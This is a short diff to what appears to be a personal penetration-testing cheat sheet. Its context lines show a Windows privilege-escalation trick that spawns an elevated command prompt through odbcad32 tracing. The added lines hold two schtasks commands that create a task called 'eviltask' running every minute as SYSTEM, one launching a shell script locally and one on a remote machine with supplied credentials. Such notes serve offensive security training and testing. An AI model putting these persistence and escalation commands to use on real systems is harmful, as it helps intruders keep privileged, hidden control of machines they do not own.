@@ -130,4 +130,8 @@ PrivEsc
     Open CMD; Open another CMD (As Admin; select NO)
     cd c:\windows\system32 -> odbcad32.exe -> Tracing -> add cmd.exe to pathbar
     
+  Persistance
+    schtasks /create /sc minute /mo 1 /tn "eviltask" /tr C:\tools\shell.cmd /ru "SYSTEM"
+    schtasks /create /sc minute /mo 1 /tn "eviltask" /tr calc /ru "SYSTEM" /s comp_name /u user /p password
+    
  Artfact,PS_Log,Term_Log,CS_log [gui+cmd],CherTree
